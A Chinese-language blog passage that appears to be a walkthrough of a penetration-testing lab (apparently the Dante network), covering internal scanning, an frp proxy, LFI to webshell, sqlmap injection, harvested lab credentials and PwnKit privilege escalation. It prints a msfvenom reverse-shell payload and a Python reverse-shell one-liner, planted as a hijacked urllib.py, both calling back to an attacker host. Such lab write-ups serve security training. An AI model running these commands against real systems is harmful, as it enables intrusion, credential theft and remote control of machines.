+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们就直接利用sudo的存在的漏洞进行提权，直接用msf提就行，我们直接搜<code> CVE-2021-3156</code>，然后就能得到利用脚本，最后成功提权：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211010435004.png" alt="image-20250211010435004"></p>
+<p>然后就能得到第二个flag，第三个也在root文件夹中：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211015022738.png" alt="image-20250211015022738"></p>
+<p>然后查看路由，发现第二个ip段，我们上传fscan扫描下这个网段：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;fscan -h 172.16.1.0&#x2F;24 -np -no -nopoc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>扫描出结果如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">172.16.1.1:
+    80 (HTTP)
+    443 (HTTPS)
+
+172.16.1.5:
+    21 (FTP)
+    139 (NetBIOS)
+    445 (SMB)
+    1433 (SQL Server)
+    135 (Windows RPC)
+
+172.16.1.10:
+    22 (SSH)
+    80 (HTTP)
+    139 (NetBIOS)
+    445 (SMB)
+
+172.16.1.12:
+    21 (FTP)
+    22 (SSH)
+    80 (HTTP)
+    443 (HTTPS)
+    3306 (MySQL)
+
+172.16.1.13:
+    80 (HTTP)
+    443 (HTTPS)
+    445 (SMB)
+
+172.16.1.17:
+    80 (HTTP)
+    139 (NetBIOS)
+    445 (SMB)
+    10000 (Webmin)
+
+172.16.1.19:
+    80 (HTTP)
+    8080 (Web，403 禁止访问)
+
+172.16.1.20:
+    22 (SSH)
+    80 (HTTP)
+    443 (HTTPS)
+    139 (NetBIOS)
+    445 (SMB)
+    88 (Kerberos)
+    135 (Windows RPC)
+
+172.16.1.100:
+    21 (FTP)
+    22 (SSH)
+    80 (HTTP)
+
+172.16.1.101:
+    21 (FTP)
+    139 (NetBIOS)
+    445 (SMB)
+    135 (Windows RPC)
+
+172.16.1.102:
+    80 (HTTP)
+    443 (HTTPS)
+    139 (NetBIOS)
+    445 (SMB)
+    3306 (MySQL)
+    135 (Windows RPC)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后这段跟据这些就能开始内网的渗透了，先用frp配个代理出来：</p>
+<pre class="line-numbers language-frpc.toml" data-language="frpc.toml"><code class="language-frpc.toml">serverAddr &#x3D; &quot;10.10.17.141&quot;		&#x2F;&#x2F;攻击机地址
+serverPort &#x3D; 7000
+
+[[proxies]]
+name &#x3D; &quot;socks5&quot;
+type &#x3D; &quot;tcp&quot;
+remotePort &#x3D; 6021
+[proxies.plugin]
+type &#x3D; &quot;socks5&quot;
+
+&#x2F;&#x2F;		.&#x2F;frpc -c frpc.toml    启动命令，在跳板机上运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-frps.toml" data-language="frps.toml"><code class="language-frps.toml">[common]
+bind_port &#x3D; 7000 &#x2F;&#x2F;在攻击机上运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后就正常配好了代理，我们接下来进入后渗透</p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>我们拿goby仔细扫描下，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216174408476.png" alt="image-20250216174408476"></p>
+<h3 id="172-16-1-10"><a href="#172-16-1-10" class="headerlink" title="172.16.1.10"></a>172.16.1.10</h3><p>扫描结果：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175719367.png" alt="image-20250216175719367"></p>
+<p>没啥特殊的东西，访问下页面，也没啥特殊的东西，查看页面源代码，发现有一个地方像是文件包含，然后尝试下成功文件包含：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211222134527.png" alt="image-20250211222134527"></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211222154567.png" alt="image-20250211222154567"></p>
+<p>然后就继续向下利用，直接利用php的filter链写马即可：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211224028970.png" alt="image-20250211224028970"></p>
+<p>然后写个马，配个代理用蚁剑连一下就成功获取了第三个flag:<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211231916110.png" alt="image-20250211231916110"></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250211231926783.png" alt="image-20250211231926783"></p>
+<p>然后上传正向连接木马来进行上线，这里如过直接使用msf的代理十分的不稳定，建议使用frp的代理，我在这里尝试了半天，死活msf的木马上不了线，算了，只能先提权，通过漏洞扫描脚本扫出如下漏洞：</p>
+<pre class="line-numbers language-none"><code class="language-none">(www-data:&#x2F;var&#x2F;www&#x2F;html&#x2F;deerhost) $ .&#x2F;linux-exploit-suggester.sh
+[1;37mAvailable information:[0m
+Kernel version: [1;32m5.15.0[0m
+Architecture: [1;32mx86_64[0m
+Distribution: [1;32mubuntu[0m
+Distribution version: [1;32m20.04[0m
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): [1;32mperformed[0m
+Package listing: [1;32mfrom current OS[0m
+[1;37mSearching among:[0m
+81 kernel space exploits
+49 user space exploits
+[1;37mPossible Exploits:[0m
+cat: write error: Broken pipe
+cat: write error: Broken pipe
+[+] [1;32m[CVE-2022-2586][0m nft_object UAF
+   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
+   Exposure: probable
+   Tags: [0;93m[ ubuntu&#x3D;(20.04) ][0m&#123;kernel:5.12.13&#125;
+   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)
+[+] [1;32m[CVE-2022-0847][0m DirtyPipe
+   Details: https:&#x2F;&#x2F;dirtypipe.cm4all.com&#x2F;
+   Exposure: probable
+   Tags: [0;93m[ ubuntu&#x3D;(20.04|21.04) ][0m,debian&#x3D;11
+   Download URL: https:&#x2F;&#x2F;haxx.in&#x2F;files&#x2F;dirtypipez.c
+[+][1;32m[CVE-2021-4034][0m PwnKit
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
+   Exposure: probable
+   Tags: [0;93m[ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ][0m,debian&#x3D;7|8|9|10|11,fedora,manjaro
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main
+[+] [1;32m[CVE-2021-3156][0m sudo Baron Samedit
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint&#x3D;19,[0;93m[ ubuntu&#x3D;18|20 ][0m, debian&#x3D;10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+[+] [1;32m[CVE-2021-3156][0m sudo Baron Samedit 2
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos&#x3D;6|7|8,[0;93m[ ubuntu&#x3D;14|16|17|18|19|20 ][0m, debian&#x3D;9|10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+[+] [1;32m[CVE-2021-22555][0m Netfilter heap out-of-bounds write
+   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
+   Exposure: probable
+   Tags: [0;93m[ ubuntu&#x3D;20.04 ][0m&#123;kernel:5.8.0-*&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
+   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
+   Comments: ip_tables kernel module must be loaded
+[+] [1;32m[CVE-2022-32250][0m nft_object UAF (NFT_MSG_NEWSET)
+   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
+https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
+   Exposure: less probable
+   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我本来打算先提权，再上马，结果发现这些个脚本都没法提权，没办法，继续上马，最后发现用<code>linux/x64/meterpreter/reverse_tcp</code>这个模块成功上马,，这里可以多试几次，可能是网络问题，导致我们有些时候没连上：</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.17.141 LPORT&#x3D;6666 -f elf &gt; shell.elf
+
+
+msfconsole -q
+use exploit&#x2F;multi&#x2F;handler
+set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 10.10.17.141
+set LPORT 6666
+exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>反弹shell出来后通过下面的命令获取可交互式终端，不然用不了sudo:</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;
+&#x2F;&#x2F;或是
+script &#x2F;dev&#x2F;null -c bash
+export TERM&#x3D;xterm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后找config文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@DANTE-NIX02:~$ find &#x2F;var&#x2F;www&#x2F;html -type f -name &quot;*config*&quot; 2&gt;&#x2F;dev&#x2F;null 
+&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentynineteen&#x2F;postcss.config.js
+&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;views&#x2F;config.php
+&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-admin&#x2F;setup-config.php
+&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后在<code>wp-config.php</code>文件中发现一个账号密码，<code>margaret</code>|<code>Welcome1!2@3#</code>：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213205542707.png" alt="image-20250213205542707"></p>
+<p>我们用sudo尝试下登陆，登陆成功，但是是受限模式，我们只能执行几个命令</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213210130418.png" alt="image-20250213210130418"></p>
+<p>直接限制绕过即可，参考 <a target="_blank" rel="noopener" href="https://www.yongz.fun/posts/49dbd3aa.html">Linux rbash 限制绕过</a> 这篇文章，最后逃逸成功：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213212521128.png" alt="image-20250213212521128"></p>
+<p>在<code>/home/frank/Downloads</code>文件夹中发现下面的文件，我们把文件下载下来查看下</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213221740047.png" alt="image-20250213221740047"></p>
+<p>我们在解压之后中的secure文件夹中的json文件中找到了两个密码，<code>STARS5678FORTUNE401</code>、<code>69F15HST1CX</code></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213224201257.png" alt="image-20250213224201257"></p>
+<p>用户名就是frank，但我们测试过后都不能登陆，猜测可能是这个导出文件被加密了，我们看一眼他原本的<code>.config</code>文件夹中的内容，发现真正的密码：</p>
+<p><code>TractorHeadtorchDeskmat</code>、<code>STARS5678FORTUNE401</code></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250213225414627.png" alt="image-20250213225414627"></p>
+<p>然后我们登陆frank，继续向下走，然后我查看定时任务，发现没有什么特殊的东西，怀疑是隐藏的任务，我们用下工具<code>pspy</code>，我们能够发现一个特殊的进程：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;pspy64 -pf -i 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214002713494.png" alt="image-20250214002713494"></p>
+<p>我们再查看一下这个文件，内容如下</p>
+<pre class="line-numbers language-none"><code class="language-none">import call
+import urllib
+url &#x3D; urllib.urlopen(localhost)
+page&#x3D; url.getcode()
+if page &#x3D;&#x3D;200:
+        print (&quot;We&#39;re all good!&quot;)
+else:
+        print(&quot;We&#39;re failing!&quot;)
+        call([&quot;systemctl start apache2&quot;], shell&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但他的权限只有root才能读写，不能直接改变，但我们能在当前文件下编写一个<code>urllib.py</code>文件，在运行时，会优先引用当前文件夹中的内容</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">echo <span class="token string">'import os,pty,socket;s=socket.socket();s.connect(("10.10.17.141",9856));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</span> <span class="token operator">></span> urllib<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在本地启动监听，等几分钟就能连上了</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214005322422.png" alt="image-20250214005322422"></p>
+<p>这台机器我们就完成了。</p>
+<h3 id="172-16-1-12"><a href="#172-16-1-12" class="headerlink" title="172.16.1.12"></a>172.16.1.12</h3><p>扫描结果：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175547593.png" alt="image-20250216175547593"></p>
+<p>直接就先看443和80端口，看看web服务是什么，登陆之后发现是<code>XAMPP Apache</code>服务，dirsearch扫描结果如下</p>
+<pre class="line-numbers language-none"><code class="language-none">dirsearch -u https:&#x2F;&#x2F;172.16.1.12&#x2F; --proxy socks5:&#x2F;&#x2F;10.10.17.141:6021<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214154700756.png"></p>
+<p>phpinfo.php中查看到php版本为7.4.7和一些其他东西，然后我们在网上搜索到当前服务的漏洞，只有windows环境下的漏洞，但我们当前环境是Linux，所以不合适，然后我们在<code>/blog</code>路由有一个博客页面，我们加上这个路由再扫一下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214182607618.png" alt="image-20250214182607618"></p>
+<p>并没有什么有用的东西，但是我们可以在路由中发现一个sql注入</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214182707793.png" alt="image-20250214182707793"></p>
+<p>用sqlmap跑一下，找到我们本台机器的第一个flag和博客的admin相关内容，这里os-shell不成功：</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.1.12&#x2F;blog&#x2F;category.php?id&#x3D;2&quot; --proxy socks5:&#x2F;&#x2F;10.10.17.141:6021 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214183407914.png" alt="image-20250214183407914"></p>
+<p>接下来我们读取密码之后我们，直接前台登陆即可</p>
+<pre class="line-numbers language-none"><code class="language-none">admin |admin
+ben   |Welcometomyblog
+egre55|egre55<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>登陆到网页之后找半天，文件上传没权限，因为22端口开放，我们尝试用现有的密码登陆下，然后ben用户能够成功登陆，获取第二个flag</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 ssh ben@172.16.1.12 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214211023742.png" alt="image-20250214211023742"></p>
+<p>然后通过msf上个线，方便我们后续进行提权，先将木马传上机器</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 scp &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;shell.elf ben@172.16.1.12:&#x2F;home&#x2F;ben<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们将提权漏洞扫描工具上传到机器上，扫描出如下结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">Available information:
+
+Kernel version: 5.4.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 18.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+81 kernel space exploits
+49 user space exploits
+
+Possible Exploits:
+
+cat: write error: Broken pipe
+cat: write error: Broken pipe
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ],debian&#x3D;7|8|9|10|11,fedora,manjaro
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint&#x3D;19,[ ubuntu&#x3D;18|20 ], debian&#x3D;10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos&#x3D;6|7|8,[ ubuntu&#x3D;14|16|17|18|19|20 ], debian&#x3D;9|10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
+https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
+   Exposure: less probable
+   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
+   Exposure: less probable
+   Tags: ubuntu&#x3D;(20.04)&#123;kernel:5.12.13&#125;
+   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
+   Exposure: less probable
+   Tags: ubuntu&#x3D;20.04&#123;kernel:5.8.0-*&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
+   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2019-18634] sudo pwfeedback
+
+   Details: https:&#x2F;&#x2F;dylankatz.com&#x2F;Analysis-of-CVE-2019-18634&#x2F;
+   Exposure: less probable
+   Tags: mint&#x3D;19
+   Download URL: https:&#x2F;&#x2F;github.com&#x2F;saleemrashid&#x2F;sudo-cve-2019-18634&#x2F;raw&#x2F;master&#x2F;exploit.c
+   Comments: sudo configuration requires pwfeedback to be enabled.
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;detail?id&#x3D;1072
+   Exposure: less probable
+   Tags: ubuntu&#x3D;16.04&#123;ntfs-3g:2015.3.14AR.1-1build1&#125;,debian&#x3D;7.0&#123;ntfs-3g:2012.1.15AR.5-2.1+deb7u2&#125;,debian&#x3D;8.0&#123;ntfs-3g:2014.2.15AR.2-1+deb8u2&#125;
+   Download URL: https:&#x2F;&#x2F;gitlab.com&#x2F;exploit-database&#x2F;exploitdb-bin-sploits&#x2F;-&#x2F;raw&#x2F;main&#x2F;bin-sploits&#x2F;41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们直接利用msf的模块，搜索CVE-2021-4034得到<code>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</code>模块，利用这个模块低权到root，得到第三个flag</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214222052718.png" alt="image-20250214222052718"></p>
+<p>这台机器也就完成了。</p>
+<h3 id="172-16-1-13"><a href="#172-16-1-13" class="headerlink" title="172.16.1.13"></a>172.16.1.13</h3><p>扫描结果：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175507904.png" alt="image-20250216175507904"></p>
+<p>我们先看80和443端口，扫出如下内容</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250214224400375.png" alt="image-20250214224400375"></p>
+<p>我们能发现他的版本和服务跟上面172.16.1.12是相同的，不同的是这个机器是windows系统，我们还能在<code>/cgi-bin/printenv.pl</code>这个文件中找到相关的路径，我们尝试下这个系统的漏洞，</p>
+<pre class="line-numbers language-none"><code class="language-none">COMSPEC&#x3D;&quot;C:\WINDOWS\system32\cmd.exe&quot;
+CONTEXT_DOCUMENT_ROOT&#x3D;&quot;C:&#x2F;xampp&#x2F;cgi-bin&#x2F;&quot;
+CONTEXT_PREFIX&#x3D;&quot;&#x2F;cgi-bin&#x2F;&quot;
+DOCUMENT_ROOT&#x3D;&quot;C:&#x2F;xampp&#x2F;htdocs&quot;
+GATEWAY_INTERFACE&#x3D;&quot;CGI&#x2F;1.1&quot;
+HTTP_ACCEPT&#x3D;&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;
+HTTP_ACCEPT_ENCODING&#x3D;&quot;gzip, deflate&quot;
+HTTP_ACCEPT_LANGUAGE&#x3D;&quot;zh-SG,en-US;q&#x3D;0.7,en;q&#x3D;0.3&quot;
+HTTP_CONNECTION&#x3D;&quot;keep-alive&quot;
+HTTP_HOST&#x3D;&quot;172.16.1.13&quot;
+HTTP_UPGRADE_INSECURE_REQUESTS&#x3D;&quot;1&quot;
+HTTP_USER_AGENT&#x3D;&quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;115.0&quot;
+MIBDIRS&#x3D;&quot;C:&#x2F;xampp&#x2F;php&#x2F;extras&#x2F;mibs&quot;
+MYSQL_HOME&#x3D;&quot;\xampp\mysql\bin&quot;
+OPENSSL_CONF&#x3D;&quot;C:&#x2F;xampp&#x2F;apache&#x2F;bin&#x2F;openssl.cnf&quot;
+PATH&#x3D;&quot;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\gerald\AppData\Local\Microsoft\WindowsApps&quot;
+PATHEXT&#x3D;&quot;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC&quot;
+PHPRC&#x3D;&quot;\xampp\php&quot;
+PHP_PEAR_SYSCONF_DIR&#x3D;&quot;\xampp\php&quot;
+QUERY_STRING&#x3D;&quot;&quot;
+REMOTE_ADDR&#x3D;&quot;172.16.1.100&quot;
+REMOTE_PORT&#x3D;&quot;44610&quot;
+REQUEST_METHOD&#x3D;&quot;GET&quot;
+REQUEST_SCHEME&#x3D;&quot;http&quot;
+REQUEST_URI&#x3D;&quot;&#x2F;cgi-bin&#x2F;printenv.pl&quot;
+SCRIPT_FILENAME&#x3D;&quot;C:&#x2F;xampp&#x2F;cgi-bin&#x2F;printenv.pl&quot;
+SCRIPT_NAME&#x3D;&quot;&#x2F;cgi-bin&#x2F;printenv.pl&quot;
+SERVER_ADDR&#x3D;&quot;172.16.1.13&quot;
+SERVER_ADMIN&#x3D;&quot;postmaster@localhost&quot;
+SERVER_NAME&#x3D;&quot;172.16.1.13&quot;
